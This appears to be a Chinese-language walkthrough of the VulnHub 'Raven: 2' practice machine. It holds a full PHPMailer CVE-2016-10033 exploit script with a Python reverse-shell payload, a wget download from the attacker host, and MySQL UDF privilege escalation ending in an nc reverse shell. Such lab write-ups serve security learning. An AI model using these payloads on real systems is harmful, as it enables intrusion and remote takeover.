靶机地址：[Raven: 2 ~ VulnHub](https://www.vulnhub.com/entry/raven-2,269/)

主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- "192.168.1.54"
sudo nmap -p "22,80,111,57472" -sV "192.168.1.54"
# 22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
# 80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
# 111/tcp   open  rpcbind 2-4 (RPC #100000)
# 57472/tcp open  status  1 (RPC #100024)
```

查看web页面，没发现什么特别的，只在 `/contact.php` 有一个登录表单，简单尝试了一下，没发现明显的安全问题
进行web路径扫描
```Shell
sudo dirsearch -u "http://192.168.1.54"
# /.DS_Store
# /vendor/
# /wordpress/
# /wordpress/wp-login.php
```

访问 `/wordpress` 加载很慢，查看源码，需要修改hosts文件
```
# raven.local
192.168.1.54    raven.local
```
简单尝试，没发现明显的安全问题
进一步探测
```Shell
sudo dirsearch -u "http://raven.local/wordpress"
# /wordpress/wp-content/upgrade/
# /wordpress/wp-content/uploads/
```
`http://raven.local/wordpress/wp-content/uploads/2018/11/flag3.png` 路径下发现一个flag

`http://raven.local/vendor/PATH` 路径下发现一个flag
`http://raven.local//vendor/VERSION` 路径下发现版本信息 `5.2.16`
`http://raven.local//vendor/SECURITY.md` 中提示了当前版本存在的漏洞 `CVE-2016-10033`
```Shell
searchsploit PHPMailer
# PHPMailer < 5.2.18 - Remote Code Execution | php/webapps/40974.py
cp /usr/share/exploitdb/exploits/php/webapps/40974.py .
```
修改漏洞利用代码的如下位置
```Python
from requests_toolbelt import MultipartEncoder
import requests
import os
import base64
from lxml import html as lh

os.system('clear')

# 修改目标链接
target = 'http://raven.local/contact.php'
# 修改上传的文件名
backdoor = '/rs.php'

# 修改反弹shell的目标IP和端口号
payload = '<?php system(\'python -c """import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\'192.168.1.26\\\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"])"""\'); ?>'
# 修改上传的目标文件名和位置
fields={'action': 'submit',
        'name': payload,
        'email': '"anarcoder\\\" -OQueueDirectory=/tmp -X/var/www/html/rs.php server\" @protonmail.com',
        'message': 'Pwned'}

m = MultipartEncoder(fields=fields,
                     boundary='----WebKitFormBoundaryzXJpHSq4mNy35tHe')

headers={'User-Agent': 'curl/7.47.0',
         'Content-Type': m.content_type}

print('[+] SeNdiNG eVIl SHeLL To TaRGeT....')
r = requests.post(target, data=m.to_string(),
                  headers=headers)
print('[+] SPaWNiNG eVIL sHeLL..... bOOOOM :D')
r = requests.get(target+backdoor, headers=headers)
if r.status_code == 200:
    print('[+]  ExPLoITeD ' + target)
```
执行一下看看
```Shell
python3 -m venv env
source env/bin/activate
pip3 install requests_toolbelt
pip3 install lxml
python3 40974.py
```
访问 `http://raven.local/rs.php` 可以成功访问到上传的文件
监听端口重新访问，成功获取到反弹shell，先升级一下
```Shell
python -c 'import pty; pty.spawn("/bin/bash")'
# python3 -c 'import pty; pty.spawn("/bin/bash")'
# <Ctrl-Z> 挂起

stty raw -echo
fg
export SHELL=/bin/bash
export TERM=screen
stty rows 100 columns 200
reset
```
尝试提权
```Shell
ss -antlp
# 3306
cat /var/www/html/wordpress/wp-config.php
# define('DB_NAME', 'wordpress');
# define('DB_USER', 'root');
# define('DB_PASSWORD', 'R@v3nSecurity');

mysql -u root -p
# R@v3nSecurity
mysql > system id;
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
还是普通用户无法直接利用，但是 `mysql` 确实是root进程，尝试UDF提权
`kali` 中自带一些可以直接使用的动态链接库
```Shell
locate "*mysqludf*"
```
结果如下
```
/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.dll
/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_32.so
/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.dll
/usr/share/metasploit-framework/data/exploits/mysql/lib_mysqludf_sys_64.so
```
尝试提权
```Shell
cd /tmp/
wget http://192.168.1.26:7331/lib_mysqludf_sys_64.so -O udf.so
mysql -u root -p
# password
mysql> show variables like '%plugin%';
# plugin_dir : /usr/lib/mysql/plugin/

# 通过MySQL写动态库 通过建一个过渡表
# 随便进入一个数据库就行 不一定是mysql
mysql> use mysql;
# 表名避免冲突
mysql> create table temp(line blob);
mysql> insert into temp values(load_file('/tmp/udf.so'));
mysql> select * from temp into dumpfile '/usr/lib/mysql/plugin/udf.so';

# 不一定是sys_exec
# 其它函数的可以通过 strings udf.so 查看
mysql> create function sys_exec returns integer soname 'udf.so';
# 检查是否可以UDF提权
mysql> select sys_exec('id > /tmp/tset.txt');
# 检查下属主属组是不是root账号
ls -l /tmp/tset.txt
# 利用 如反弹shell
mysql> select sys_exec('nc 192.168.1.26 3333 -e /bin/bash');
```
成功提权
